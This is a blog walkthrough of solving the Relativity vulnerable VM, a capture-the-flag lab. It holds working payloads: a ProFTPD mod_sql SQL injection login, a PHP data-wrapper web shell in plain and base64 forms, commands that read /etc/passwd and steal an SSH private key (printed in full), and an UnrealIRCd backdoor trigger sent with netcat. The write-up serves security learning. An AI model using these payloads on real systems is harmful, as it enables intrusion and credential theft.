</a>
</li>
<li>
<a href=https://leonjza.github.io/archives title=Archive>
<span>Archive</span>
</a>
</li>
<li>
<a href=https://leonjza.github.io/categories title=Categories>
<span>Categories</span>
</a>
</li>
<li>
<a href=https://leonjza.github.io/search/ title="Search (Alt + /)" accesskey=/>
<span>Search</span>
</a>
</li>
</ul>
</nav>
</header>
<main class=main>
<article class=post-single>
<header class=post-header>
<div class=breadcrumbs><a href=https://leonjza.github.io>Home</a>&nbsp;»&nbsp;<a href=https://leonjza.github.io/posts/>Posts</a></div>
<h1 class=post-title>
slash root slash flag dot txt Solving the Relativity Vulnerable VM
</h1>
<div class=post-meta>November 18, 2013&nbsp;·&nbsp;19 min&nbsp;·&nbsp;Leon Jacobs&nbsp;|&nbsp;<a href=https://github.com/leonjza/leonjza.github.io/tree/source/content/posts/2013-11-18-slash-root-slash-flag-dot-txt-solving-the-relativity-vulnerable-vm.markdown rel="noopener noreferrer" target=_blank>Suggest Changes</a>
</div>
</header> <div class=toc>
<details>
<summary accesskey=c title="(Alt + C)">
<span class=details>Table of Contents</span>
</summary>
<div class=inner><ul>
<li>
<a href=#foreword aria-label=foreword>foreword</a><ul>
<li>
<a href=#the-challenge aria-label="the challenge">the challenge</a></li>
<li>
<a href=#initial-enumeration aria-label="initial enumeration">initial enumeration</a><ul>
<li>
<a href=#putting-the-enumeration-together aria-label="putting the enumeration together">putting the enumeration together</a></li></ul>
</li>
<li>
<a href=#the-initial-attack aria-label="the initial attack">the initial attack</a></li>
<li>
<a href=#web-based-attack aria-label="web based attack">web based attack</a></li>
<li>
<a href=#exploiting-the-web-based-vulnerability aria-label="exploiting the web based vulnerability">exploiting the web based vulnerability</a></li>
<li>
<a href=#gaining-further-access aria-label="gaining further access">gaining further access</a></li>
<li>
<a href=#enumerating-the-next-step aria-label="enumerating the next step">enumerating the next step</a></li>
<li>
<a href=#good-ol-irc aria-label="good &amp;lsquo;ol irc">good &lsquo;ol irc</a></li>
<li>
<a href=#the-shortest-straw aria-label="the shortest straw">the shortest straw</a></li>
<li>
<a href=#finishing-off aria-label="finishing off">finishing off</a>
</li>
</ul>
</li>
</ul>
</div>
</details>
</div>
<div class=post-content><h2 id=foreword>foreword<a hidden class=anchor aria-hidden=true href=#foreword>#</a></h2>
<p>At the time of writing this post, this VM was part of a local security communities (<a href=http://zacon.org.za/>zacon</a>) pre-con challenge. Finding /root/flag.txt would have entered you into a draw for winning a prize :D However, the greater goal of the challenge was to learn something. I set out some time and attempted the challenge. Fortunately, I managed to complete it in time. So, this is the journey I took to solve this. You can now download and try this VM yourself over at <a href=http://vulnhub.com/entry/devrandom_relativity,55/>VulnHub</a>. Unzip, mount and boot the VM. Once the VM is booted, it should have an IP assigned via DHCP.</p>
<p>I think it is interesting to note that I used a very limited set of tools to complete this. No bruteforcers, metasploits, vulnerability scanners and or fancy proxies were used. My toolset consisted out of netcat, nmap and other basic bash commands. There are probably a gazillion ways to do this as lots of this stuff is preference based on how they are approached. However, the basic ideas of the vulnerabilities remain the same.</p>
<h3 id=the-challenge>the challenge<a hidden class=anchor aria-hidden=true href=#the-challenge>#</a></h3>
<p>It all started with an announcement on the Zacon mailing list. A friendly heads-up about the challenge and some details were made available. We were given a hostname of where the challenge lived with clear instructions to find <code>flag.txt</code>. Sounds simple. I slapped the hostname as a url in a browser and was met with a image of M.C. Eshter&rsquo;s &lsquo;Relativity&rsquo;. Great. Something to start thinking about. I also nmapped the box. I mean, how else would you start, right? :)</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#75715e># 192.168.56.21 Nmap</span>
Nmap scan report <span style=color:#66d9ef>for</span> 192.168.56.21 <span style=color:#f92672>(</span>192.168.56.21<span style=color:#f92672>)</span>
Host is up <span style=color:#f92672>(</span>0.0024s latency<span style=color:#f92672>)</span>.
Not shown: <span style=color:#ae81ff>997</span> filtered ports
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
</code></pre></div><p>Alright. This gives you a good idea of whats happening on the host, as well as some points to start off with.</p>
<h3 id=initial-enumeration>initial enumeration<a hidden class=anchor aria-hidden=true href=#initial-enumeration>#</a></h3>
<p>Enumeration is key to starting something like this. The more you know about the host, the more you are able to adapt and think about as you go through the challenge. So, we know we have a SSH Server, a FTP server and a Web server exposed.</p>
<p>Starting with the SSH server, I tried to check if password based authentication was on. Maybe Mr MC Eshter had an account on this box? You never know :)</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$ ssh eshter@192.168.56.21
Permission denied <span style=color:#f92672>(</span>publickey<span style=color:#f92672>)</span>.
</code></pre></div><p>So, we now know only key based authentication works. Thats fine. Next up was the FTP service.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$ ftp 192.168.56.21
Connected to 192.168.56.21.
<span style=color:#ae81ff>220</span> Welcome to Relativity FTP <span style=color:#f92672>(</span>mod_sql<span style=color:#f92672>)</span>
Name <span style=color:#f92672>(</span>192.168.56.21:root<span style=color:#f92672>)</span>: anonymous
<span style=color:#ae81ff>331</span> Password required <span style=color:#66d9ef>for</span> anonymous.
Password:
<span style=color:#ae81ff>530</span> Login incorrect.
Login failed.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp&gt;
</code></pre></div><p>No anonymous FTP logins either. It appears that the Server&rsquo;s FTP banner has been customised and is maybe using the mod_sql plugin. A quick Google for mod_sql revealed that this may be ProFTPD with the mod_sql plugin. Great. This is an important piece of information. To complete the enumeration I moved on to the web server. It was time to inspect some request responses.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>$ curl -v 192.168.56.21
* About to connect() to 192.168.56.21 port 80 (#0)
*   Trying 192.168.56.21...
* connected
* Connected to 192.168.56.21 (192.168.56.21) port 80 (#0)
&gt; GET / HTTP/1.1
&gt; User-Agent: curl/7.26.0
&gt; Host: 192.168.56.21
&gt; Accept: */*
&gt;
* additional stuff not fine transfer.c:1037: 0 0
* HTTP 1.1 or later with persistent connection, pipelining supported
&lt; HTTP/1.1 200 OK
&lt; Date: Sat, 28 Sep 2013 23:12:28 GMT
&lt; Server: Apache/2.2.23 (Fedora)
&lt; Last-Modified: Tue, 05 Mar 2013 03:24:29 GMT
&lt; ETag: &#34;4ecb-82-4d72502eec502&#34;
&lt; Accept-Ranges: bytes
&lt; Content-Length: 130
&lt; Connection: close
&lt; Content-Type: text/html; charset=UTF-8
&lt;
&lt;html&gt;
&lt;head&gt;&lt;title&gt;M.C. Escher - Relativity&lt;/title&gt;&lt;/head&gt;
&lt;body&gt;
&lt;/br&gt;
&lt;center&gt;&lt;img src=&#34;artwork.jpg&#34;&gt;&lt;/center&gt;
&lt;/body&gt;
&lt;/html&gt;
* Closing connection #0
</code></pre></div><h4 id=putting-the-enumeration-together>putting the enumeration together<a hidden class=anchor aria-hidden=true href=#putting-the-enumeration-together>#</a></h4>
<p>With the little bit of poking around we have just done, we are able to say that this may be a Fedora Core Server, running Apache 2.2.13, with ProFTPD and the mod_sql plugin. This already gives us quite a lot to work with in the sense of researching the respective software in search of known vulnerabilities.</p>
<p>With me loving web based security, my first attempt at further enumerating the machine was via the web server. I searched for <code>cgi-bin/</code> type problems, potentially hidden directories via <code>robots.txt</code>, username enumeration via home directories etc. to no avail. At some stage it became very apparent that the initial entry point for this server was not via the Web.</p>
<h3 id=the-initial-attack>the initial attack<a hidden class=anchor aria-hidden=true href=#the-initial-attack>#</a></h3>
<p>The next step was the FTP server. As it was purposely disclosing the fact that it was using mod_sql, instinct kicked in and I attempted to check the responses if I tried to login with username <strong>'</strong> and password <strong>'</strong>.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#75715e># ftp 192.168.56.21</span>
Connected to 192.168.56.21.
<span style=color:#ae81ff>220</span> Welcome to Relativity FTP <span style=color:#f92672>(</span>mod_sql<span style=color:#f92672>)</span>
Name <span style=color:#f92672>(</span>192.168.56.21:root<span style=color:#f92672>)</span>: <span style=color:#e6db74>&#39;
</span><span style=color:#e6db74>331 Password required for &#39;</span>.
Password:
<span style=color:#ae81ff>421</span> Service not available, remote server has closed connection
Login failed.
No control connection <span style=color:#66d9ef>for</span> command: Success
ftp&gt;
</code></pre></div><p>As you can clearly see, the response does differ from when I initially attempted to login as anonymous. This highly suggests that one of the fields is SQL injectable. And so, it was research time. Using good &lsquo;ol trusty Google, I searched for <em>proftpd mod_sql injection vulnerability</em>. Hey presto! The very first hit describes a vulnerability <a href=http://www.securityfocus.com/bid/33722>disclosed</a> in 2009.</p>
<p>From this research, we can be pretty confident in thinking that this specific FTP server may as well be vulnerable to the exact same vulnerability, and may very well be our first entry point into the system. Sample exploits are available <a href=http://www.securityfocus.com/bid/33722/exploit>here</a>, and as such I attempted to exploit this. I copied the SQLi payload from the website <code>%') and 1=2 union select 1,1,uid,gid,homedir,shell from users; --</code> and pasted this as the username, whereafter I provided 1 as the password.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#75715e># ftp 192.168.56.21</span>
Connected to 192.168.56.21.
<span style=color:#ae81ff>220</span> Welcome to Relativity FTP <span style=color:#f92672>(</span>mod_sql<span style=color:#f92672>)</span>
Name <span style=color:#f92672>(</span>192.168.56.21:root<span style=color:#f92672>)</span>: %<span style=color:#e6db74>&#39;) and 1=2 union select 1,1,uid,gid,homedir,shell from users; --
</span><span style=color:#e6db74>331 Password required for %&#39;</span><span style=color:#f92672>)</span>.
Password:
<span style=color:#ae81ff>421</span> Service not available, remote server has closed connection
Login failed.
No control connection <span style=color:#66d9ef>for</span> command: Success
ftp&gt; bye
</code></pre></div><p>No dice. :| Ok, well I guess I couldn&rsquo;t have expected it to be <em>that</em> easy. This caused me to dig even deeper and research exactly what the problem is, and why this vulnerability exists. Eventually, I got hold of a vulnerable version of the software, set it up in a LAB VM, and tested the SQLi payload until it worked. I ended up with a slightly different payload to the ones available online.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#75715e># ftp 192.168.56.21</span>
Connected to 192.168.56.21.
<span style=color:#ae81ff>220</span> Welcome to Relativity FTP <span style=color:#f92672>(</span>mod_sql<span style=color:#f92672>)</span>
Name <span style=color:#f92672>(</span>192.168.56.21:root<span style=color:#f92672>)</span>: %<span style=color:#e6db74>&#39;) and 1=2 union select 1,1,uid,gid,homedir,shell from users;#
</span><span style=color:#e6db74>331 Password required for %&#39;</span><span style=color:#f92672>)</span>.
Password:
<span style=color:#ae81ff>230</span> User %<span style=color:#960050;background-color:#1e0010>&#39;</span><span style=color:#f92672>)</span> and 1<span style=color:#f92672>=</span><span style=color:#ae81ff>2</span> union <span style=color:#66d9ef>select</span> 1,1,uid,gid,homedir,shell from users;<span style=color:#75715e># logged in.</span>
Remote system type is UNIX.
Using binary mode to transfer files.
ftp&gt;
</code></pre></div><p>w00t. Notice the difference though? The SQL commenting was changed from &ndash; to #. Apparently, MySQL is pretty finicky about the fact that the &ndash; style comments should have a space afterwards. This means that a payload ending with say, <code>from users; -- NOTHING_OF_VALUE</code> would have worked too. Just putting a space after the &ndash; did not work as the software most probably does a type of <code>trim()</code> on the field, hence the need to have something after the space too. Awesome, something learnt.</p>
<h3 id=web-based-attack>web based attack<a hidden class=anchor aria-hidden=true href=#web-based-attack>#</a></h3>
<p>Now that we have FTP access to the host, we simply needed to <code>ls</code> to learn what is the next step.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>ftp&gt; ls
<span style=color:#ae81ff>200</span> PORT command successful
<span style=color:#ae81ff>150</span> Opening ASCII mode data connection <span style=color:#66d9ef>for</span> file list
drwxr-xr-x   <span style=color:#ae81ff>3</span> root     root         <span style=color:#ae81ff>4096</span> Mar  <span style=color:#ae81ff>5</span>  <span style=color:#ae81ff>2013</span> 0f756638e0737f4a0de1c53bf8937a08
-rw-r--r--   <span style=color:#ae81ff>1</span> root     root       <span style=color:#ae81ff>235423</span> Mar  <span style=color:#ae81ff>5</span>  <span style=color:#ae81ff>2013</span> artwork.jpg
-rw-r--r--   <span style=color:#ae81ff>1</span> root     root          <span style=color:#ae81ff>130</span> Mar  <span style=color:#ae81ff>5</span>  <span style=color:#ae81ff>2013</span> index.html
<span style=color:#ae81ff>226</span> Transfer complete.
ftp&gt; cd 0f756638e0737f4a0de1c53bf8937a08
<span style=color:#ae81ff>550</span> 0f756638e0737f4a0de1c53bf8937a08: Permission denied
ftp&gt;
</code></pre></div><p>A directory called &lsquo;0f756638e0737f4a0de1c53bf8937a08&rsquo; was present, however our FTP user does not have access to this. We are able to deduce that this is in the web folder based on the content of the directory we have access to. So, time to slap http://192.16.56.21/0f756638e0737f4a0de1c53bf8937a08 into a web browser.</p>
<h3 id=exploiting-the-web-based-vulnerability>exploiting the web based vulnerability<a hidden class=anchor aria-hidden=true href=#exploiting-the-web-based-vulnerability>#</a></h3>
<p>Browsing to the above mentioned URL revealed a PHP driven website filled with information about the Relativity artwork. While this in itself was interesting, the real interest was in the url&rsquo;s to different parts of the website. More specifically, the urls were composed as <code>index.php?page=definition.php</code>. Immediately this suggested that the file <code>index.php</code> was programmed to include other files in order to render the content. In the examples case it included definition.php.</p>
<p>My first attempts to exploit this was very successful. For this kind of potential vulnerability, I have a small PHP <a href=http://php.net/manual/en/wrappers.data.php>data stream wrapper</a> shell in my toolbox. Normally, the shell looks something like this:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=color:#f92672>?</span><span style=color:#a6e22e>file</span><span style=color:#f92672>=</span><span style=color:#a6e22e>data</span><span style=color:#f92672>:</span>,<span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span> <span style=color:#a6e22e>system</span>($_GET[<span style=color:#a6e22e>c</span>]); <span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>&amp;c=ls
</span></code></pre></div><p>Sometimes however, sites tend to attempt to filter out certain PHP commands. So, in order to increase the chances of success, a base64 encoded version ends up being my favourite:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=color:#f92672>?</span><span style=color:#a6e22e>file</span><span style=color:#f92672>=</span><span style=color:#a6e22e>data</span><span style=color:#f92672>:</span>;<span style=color:#a6e22e>base64</span>,<span style=color:#a6e22e>PD9waHAgc3lzdGVtKCRfR0VUW2NdKTsgPz4</span><span style=color:#f92672>=&amp;</span><span style=color:#a6e22e>c</span><span style=color:#f92672>=</span><span style=color:#a6e22e>dir</span>
</code></pre></div><p>I used this and now had shell access to the box. Remembering the basic tips of enumerate->exploit->post-exploit, I ran a few simple commands, just to get a better feel for the environment that I was facing. I was using Google Chrome. If you add &lsquo;view-source:&rsquo; to the front of a url, or right click-> view source, then you will see the output for your command shell in a much neater and easier to read layout. I ran the commands <code>id; uname -a; sestatus; pwd; ls -lah /home; cat /etc/passwd</code>:</p>
<figure>
<img loading=lazy src=/images/relativity_command_injection.png>
</figure>
<p>From this we know that the server is running Fedora Core 17, with the 3.9.8-100 kernel. SELinux is disabled. There are 2 users with /home directories, of which <code>jetta</code>&rsquo;s directory is protected from me reading it at the moment. root, mauk and jetta all have valid logins shells too.</p>
<p>Taking one quick step back, I investigated the sources of the website in order to maybe find some credentials that may attach this website to a database or something similarly useful. While doing this, I noticed the index.php page was in fact doing partial input validation, which may cause some web shells not to work :)</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php>$blacklist_include<span style=color:#f92672>=</span><span style=color:#66d9ef>array</span>(<span style=color:#e6db74>&#34;php://&#34;</span>);
<span style=color:#66d9ef>for</span> ($i<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>; $i<span style=color:#f92672>&lt;</span><span style=color:#a6e22e>count</span>($blacklist_include); $i<span style=color:#f92672>++</span>){
         <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>strpos</span>($_GET[<span style=color:#e6db74>&#39;page&#39;</span>],$blacklist_include[$i]) <span style=color:#f92672>!==</span> <span style=color:#66d9ef>false</span>){
                <span style=color:#66d9ef>die</span>();
        }
}
$page <span style=color:#f92672>=</span> $_GET[<span style=color:#e6db74>&#39;page&#39;</span>];
<span style=color:#66d9ef>include</span> ($page);
</code></pre></div><h3 id=gaining-further-access>gaining further access<a hidden class=anchor aria-hidden=true href=#gaining-further-access>#</a></h3>
<p>From here you can of course take the time to set yourself up with a very nice interactive shell using this web based remote file inclusion vulnerability. However, browsing around the file system its clear that you can browse in the user <code>mauk</code>&rsquo;s home directory. While the directory itself has nothing of real value, there are still the hidden directories to view. Usually, these include things such as the users bash_history, bashrc etc. Also, ssh key related information would typically reside inside .ssh/. In this users .ssh/ directory, he left he’s SSH private key there, with permissions set so that anyone can read it. So, using the web based remote file include shell we are able to steal this off the server with the command <code>cat /home/mauk/.ssh/id_rsa</code>, which would echo us the key.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA5sm/rHHoCaTtncp7DCSIJlWnUg9eyfpJ3czIn18U1lv5ZQf0
9yGaDxafualdpXCNMo32mVQb9XQ7c2N7sdSdAjsgSjV0YG/IZGZNRyFS58YJQRdZ
5wRu6eKAlQVss/Lq3zwuBsT8Om/1/cKpVgB3ukPtKA97M5iSxL1VWWXg6GVoJ6f6
zIio/DZMFCxOU9Wyl7i8ssEoBxQlmgZh9pnYYhwo7Rf3RXBJeHDpuc1g+vol2vRN
ALXqIBlItS08MhoTaS0SK+pD98OU34M745U5Mo4TgFjYc+eD7xewyduWuS5IuFPd
xfcHkt0cQ7he0AYHuk5ooCI4ca3B0xcSZILWqwIDAQABAoIBAHNnIMxXLQNdkGAd
tsfMoLQikodrHif7WuJpG0zuG5pQ5XWKtAi7qbCvzHDnaudmT4SfDld/gneLhord
jSXQPi62aCATeL0cSGVD7pKJ7E3vbgM5bQAi7F9RnqBl1QRqjN3R1uYVrFaAU85v
f4N8umHOw5ELpLyZJ5LvZfVNB1jNIRpxINhAP+/kVslsZ93qyssljokKFMy/uOIH
r+SV3b3Zfogvg67AJ/g08jtCjYdbr7egPP2TYPMRz5fbTWCrc5m4EBvf5h5pP/w6
Go12YacY2lbF5wzbFUjIdNyF7RZHFDbSB0bM9aCDmXTfywlFswYdb7HyIZrstQ9W
BzWhIYkCgYEA/tUe/rhUcEYEXkhddkXWARcX0t9YNb8apY7WyVibiSyzh33mscRG
MLZoJJri5QMvNdYkNGr5zSGEo270Q2CzduKCbhVjXIybIbmggAc/80gZ5E8FDgJ7
szUKJL37BxXbAAYFIZkzXvc76Ve+vZvLfKMTbQqXTgKkQpGyRHLVOz8CgYEA59ht
YicNlz2yM26mpGqQNLGtEC1RmyZbPn03yJRTBJG5/sOlMw0RI+cMEiqyo7MKHmMZ
+Z7VKVtk8xEQbUy6EAeeSri/Fh1xiKRtlwwQSU1q2ooPOmdHyUp+rhseoPaDAJgy
3KJYbkQMzHVt6KhsWVTEnrz0VtxiTzRu7p2Y5ZUCgYEAt5X2RG+rdU8b6oibvI9H
Q3XNlf+NXvsUSV2EY33QX5yyodQUFNFf98wRbv2epHoM0u45GwJOgHe7RLq0gq3x
3J4GdSQ3dv9c64j9lf6jFbNF4/MBozwqvcpiSmILrOkT4wpzO+dQ2QOoR80M/zB0
ApDBd/b/VhYVHFg2Y5WPBKUCgYBn47SIMgXGCtBqeZ/UtyetZRyuzg/uXQ6v/r5b
dBOLTZ2xyouhR66xjtv63AU2k4jqOvAtyf2szZZ70N6yi5ooirFkvEpsJ39zgnLV
J4O4xScnjIvsWNFzIp2HeQGNkUj8oDbSZTEJIBc4GzrH8Yizsud0VimLLrAi29UF
ubsEzQKBgQDpWaD5rTcaWueiH2DwI7kbdgyf6yfpunsRNsnq0GqZ2wSaUyKt9b1j
bj9Dp+VxrUt584v//7z9Skkde2akJbA/qiF8/oOvzaiNRAOfpLCiqoL0vJ5dIvcg
aXwuOk5Dt0/xQWPAKHL6HYyzQjnad/VAmn6tnxko1A/S8ELiG+MUtg==
-----END RSA PRIVATE KEY-----
</code></pre></div><p>What is particularly important to note here is the fact that this private key is not password protected. Usually, password protected keys would have a line such as <code>Proc-Type: 4,ENCRYPTED</code> indicating this. This key does not. So, using this, it would be as easy as specifying a private key to use when connecting and viola. I saved the the contents of <code>id_rsa</code> to a file called <code>key</code>, and specified it to be used when connecting with the <code>-i</code> flag:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#75715e># ssh mauk@192.168.56.21 -i key</span>
<span style=color:#f92672>[</span>mauk@Relativity ~<span style=color:#f92672>]</span>$ id
uid<span style=color:#f92672>=</span>1001<span style=color:#f92672>(</span>mauk<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span>1001<span style=color:#f92672>(</span>mauk<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span>1001<span style=color:#f92672>(</span>mauk<span style=color:#f92672>)</span>
<span style=color:#f92672>[</span>mauk@Relativity ~<span style=color:#f92672>]</span>$
</code></pre></div><p>w00t. Now, we have a proper interactive shell as the user <code>mauk</code>! :)</p>
<h3 id=enumerating-the-next-step>enumerating the next step<a hidden class=anchor aria-hidden=true href=#enumerating-the-next-step>#</a></h3>
<p>Again, enumerate->exploit->post-exploit are very important steps. Now we find ourselves at the post-exploitation part again. Learn as much as you can about everything you can. Having the interactive SSH session that we have now, it was a breeze to learn quite a lot about the server. More importantly, learning about that which we also don’t have access to.</p>
<p>Enumeration is not just about files and the access. It also includes network interfaces, configuration etc. In the user <code>mauk</code>&rsquo;s case, he had a .bash_history file, which revealed the key to the next part of the challenge. I also noticed port 6667 (irc) being open locally along with a ircd running as the user jetta.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#f92672>[</span>mauk@Relativity ~<span style=color:#f92672>]</span>$ cat .bash_history

ssh -f root@192.168.144.228 -R 6667:127.0.0.1:6667 -N
su -
exit
su -
<span style=color:#f92672>[</span>mauk@Relativity ~<span style=color:#f92672>]</span>$
</code></pre></div><p>The bash_history confirmed the use of the ircd, and as such, I re-setup my ssh connection to the server, this time forwarding port 6667 to my laptop so that I may connect to it with a local irc client. The ssh command now looked something like this: <code>ssh -L 6667:127.0.0.1:6667 mauk@192.168.56.21 -i key</code></p>
<h3 id=good-ol-irc>good &lsquo;ol irc<a hidden class=anchor aria-hidden=true href=#good-ol-irc>#</a></h3>
<p>With the now forwarded IRC port, my local client connected to the irc service, and the following MOTD was sent:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>Connecting…
Connected
*** Looking up your hostname...
*** Couldn<span style=color:#960050;background-color:#1e0010>&#39;</span>t resolve your hostname; using your IP address instead
Logged in
Welcome to the Relativity IRC Network bobsmith!bobsmith@localhost
Your host is relativity.localdomain, running version Unreal3.2.8.1
This server was created Thu Feb <span style=color:#ae81ff>28</span> <span style=color:#ae81ff>2013</span> at 17:54:35 EST
relativity.localdomain Unreal3.2.8.1 iowghraAsORTVSxNCWqBzvdHtGp lvhopsmntikrRcaqOALQbSeIKVfMCuzNTGj
UHNAMES NAMESX SAFELIST HCN MAXCHANNELS<span style=color:#f92672>=</span><span style=color:#ae81ff>10</span> CHANLIMIT<span style=color:#f92672>=</span><span style=color:#75715e>#:10 MAXLIST=b:60,e:60,I:60 NICKLEN=30 CHANNELLEN=32 TOPICLEN=307 KICKLEN=307 AWAYLEN=307 MAXTARGETS=20 are supported by this server</span>
WALLCHOPS WATCH<span style=color:#f92672>=</span><span style=color:#ae81ff>128</span> WATCHOPTS<span style=color:#f92672>=</span>A SILENCE<span style=color:#f92672>=</span><span style=color:#ae81ff>15</span> MODES<span style=color:#f92672>=</span><span style=color:#ae81ff>12</span> CHANTYPES<span style=color:#f92672>=</span><span style=color:#75715e># PREFIX=(qaohv)~&amp;@%+ CHANMODES=beI,kfL,lj,psmntirRcOAQKVCuzNSMTG NETWORK=Relativity CASEMAPPING=ascii EXTBAN=~,cqnr ELIST=MNUCT STATUSMSG=~&amp;@%+ are supported by this server</span>
EXCEPTS INVEX CMDS<span style=color:#f92672>=</span>KNOCK,MAP,DCCALLOW,USERIP are supported by this server
There are <span style=color:#ae81ff>1</span> users and <span style=color:#ae81ff>0</span> invisible on <span style=color:#ae81ff>1</span> servers
I have <span style=color:#ae81ff>1</span> clients and <span style=color:#ae81ff>0</span> servers
Current Local Users: <span style=color:#ae81ff>1</span>  Max: <span style=color:#ae81ff>1</span>
Current Global Users: <span style=color:#ae81ff>1</span>  Max: <span style=color:#ae81ff>1</span>
- relativity.localdomain Message of the Day -
- 9/7/2013 9:17
-     __________       .__          __  .__      .__  __
-     <span style=color:#ae81ff>\_</span>_____   <span style=color:#ae81ff>\ </span>____ |  | _____ _/  |_|__|__  _|__|/  |_ ___.__.
-      |       _// __ <span style=color:#ae81ff>\|</span>  | <span style=color:#ae81ff>\_</span>_  <span style=color:#ae81ff>\\</span>   __<span style=color:#ae81ff>\ </span> <span style=color:#ae81ff>\ </span> <span style=color:#ae81ff>\/</span> /  <span style=color:#ae81ff>\ </span>  __&lt;   |  |
-      |    |   <span style=color:#ae81ff>\ </span> ___/|  |__/ __ <span style=color:#ae81ff>\|</span>  | |  |<span style=color:#ae81ff>\ </span>  /|  <span style=color:#f92672>||</span>  |  <span style=color:#ae81ff>\_</span>__  |
-      |____|_  /<span style=color:#ae81ff>\_</span>__  &gt;____<span style=color:#f92672>(</span>____  /__| |__| <span style=color:#ae81ff>\_</span>/ |__<span style=color:#f92672>||</span>__|  / ____| ·VM·
-             <span style=color:#ae81ff>\/</span>     <span style=color:#ae81ff>\/</span>          <span style=color:#ae81ff>\/</span>                        <span style=color:#ae81ff>\/</span>
End of /MOTD command.
</code></pre></div><p>Toying around with the IRC service did not yeald much results. No useful channels or anything funny was found with the service. However, the actual server that was running was <a href=http://www.unrealircd.com/>UnrealIRCD</a> v 3.8.2.1 as can be seen in the servers MOTD. Again, using this amazing tool called Google, I checked whats up with this version of UnrealIRCD. Lo and behold the first hit &lsquo;UnrealIRCD 3.2.8.1 Backdoor Command Execution - Rapid7&rsquo;. Excellent. Seems like this version has a remote command execution backdoor. The hit on Google to Rapid7&rsquo;s actually links to a Metasploit module for this exact same backdoor.</p>
<p>It was time to research the vulnerability a bit, just to understand what exactly is going on here. A great resource was found <a href=http://blog.stalkr.net/2010/06/unrealircd-3281-backdoored.html>here</a>, where it was explained that a piece of code exists <code>#define DEBUG3_DOLOG_SYSTEM(x) system(x)</code>, that does a system command if it sees traffic prepended with <code>AB;</code>. Alright. I didn’t have metasploit immediately available, so I opted for the <code>nc</code> shell, just to test it out. To my disappointment, it seemed like I missed something very important here as I received no output when issuing commands.</p>
<p>So back to the drawing board it was. I decided to download and compile my own local version of the backdoored ircd daemon, and test what the expected result of this backdoor should be. At the same time I also learnt a little about unrealircd itself and how to configure it. win :)</p>
<p>Eventually I got the daemon running and was able to test the backdoor locally. Still, no command output was received when commands were issued, however, I did notice that the commands themselves actually <strong>do</strong> execute. I echoed &lsquo;a&rsquo; to a file in /tmp/ via the backdoor, and in a SSH session confirmed that it now existed.</p>
<p>So, back on the challenge vm, I have port 6667 still forwarded locally. To test this, I ran a command to list the contents of /home/ and redirect the output to a file in /tmp.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#75715e># echo &#34;AB; ls -lah /home/ &gt; /tmp/1&#34; | nc 127.0.0.1 6667</span>
:relativity.localdomain NOTICE AUTH :*** Looking up your hostname...
:relativity.localdomain NOTICE AUTH :*** Couldn<span style=color:#960050;background-color:#1e0010>&#39;</span>t resolve your hostname; using your IP address instead
:relativity.localdomain <span style=color:#ae81ff>451</span> AB; :You have not registered
^C
</code></pre></div><p>Back on the SSH session I had with <code>mauk</code>&rsquo;s account, /tmp/1 appeared, however without permissions for me to see it. So, I reran the previous command, substituting the backdoor command to <code>chmod 777 /tmp/1</code>. I reran the cat on /tmp/1 in mauk&rsquo;s session and bam:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>mauk@Relativity ~<span style=color:#f92672>]</span>$ cat /tmp/1
total 16K
